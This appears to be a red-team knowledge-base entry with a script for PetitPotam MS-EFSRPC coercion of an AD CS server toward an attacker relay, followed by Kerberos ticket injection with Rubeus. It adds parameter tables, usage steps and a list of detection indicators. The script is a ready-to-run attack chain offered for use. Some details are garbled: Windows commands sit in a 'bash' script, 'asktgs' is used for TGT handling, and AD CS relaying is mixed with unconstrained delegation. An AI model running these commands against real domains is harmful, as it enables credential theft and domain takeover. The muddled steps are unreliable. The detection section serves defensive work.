---
id: 09b036ee-ef4c-4db3-8fff-d52d6f82bf10
name: petitpotam-coercion-and-tgt-extraction-script
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:07.618790+00:00'
updated_at: '2023-04-10T20:36:05.391865+00:00'
platforms:
  - Linux
tags:
  - coercion
  - kerberos
  - petitpotam
validated: true
---

# petitpotam-coercion-and-tgt-extraction-script

## Code

```bash
# Coerce the callback
git clone https://github.com/topotam/PetitPotam
python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP

# Extract the ticket
.\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
```

## Description

This bash script performs a complete MS-EFSRPC coercion using PetitPotam, including repository cloning, authenticated and anonymous coercion attempts, and TGT extraction/injection with Rubeus. It assumes a relay server is running separately to capture the base64 ticket during coercion. Use this for quick execution in a red team scenario targeting AD CS servers with unconstrained delegation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $DOMAIN | Target Active Directory domain | domain.com |
| $USER | Username for authenticated coercion | attacker |
| $PASSWORD | Password for authenticated coercion | P@ssw0rd |
| $ATTACKER_IP | Attacker's IP (relay listener) | 192.168.1.100 |
| $TARGET_IP | IP of AD CS server to coerce | 10.0.0.50 |
| <ticket base64> | Base64 TGT from relay output | VXNlcjpkb21haW4uY29tAA... |

## Usage

Run the script on a Linux attacker machine with Python and Git. Ensure an NTLM relay (e.g., ntlmrelayx) is listening on $ATTACKER_IP before executing the coercion lines. After coercion, copy the base64 ticket from relay logs into the Rubeus command. Note: Rubeus requires a Windows environment; run that part separately on Windows. This script chains the steps for automation but requires manual ticket handling.

## Detection

- Git clone activity to PetitPotam repo (network logs to GitHub).
- Unusual RPC calls to MS-EFSRPC (Event ID 5827 or Sysmon RPC events).
- NTLM authentications from servers to unexpected IPs (Event ID 4624 with NTLM type).
- Rubeus execution (process creation with Rubeus.exe, command-line arguments with /ticket or /ptt).
- Anomalous Kerberos ticket requests from coerced accounts (Event ID 4769).

## Related

- [[procedures/MS-EFSRPC-Abuse-via-PetitPotam-and-Unconstrained-Delegation]]
- [[tools/PetitPotam]]
- [[tools/Rubeus]]
